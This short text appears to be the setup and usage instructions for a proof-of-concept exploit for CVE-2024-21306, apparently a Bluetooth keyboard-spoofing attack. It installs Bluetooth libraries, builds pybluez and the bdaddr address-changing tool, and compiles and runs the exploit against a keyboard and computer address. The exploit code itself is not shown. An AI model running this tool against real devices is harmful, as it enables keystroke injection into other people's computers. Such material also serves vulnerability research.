# install dependencies from apt

sudo apt install -y bluez-tools bluez-hcidump libbluetooth-dev git gcc python3-pip python3-setuptools python3-pydbus

# install pybluez from source

git clone https://github.com/pybluez/pybluez.git

cd pybluez

sudo python3 setup.py install

# build bdaddr from the bluez source

cd ~/

git clone --depth=1 https://github.com/bluez/bluez.git

gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth

sudo cp bdaddr /usr/local/bin/

# compile

gcc -o CVE-2024-21306 CVE-2024-21306.c -lbluetooth

# usage

./CVE-2024-21306 interface keyboard_address computer_address
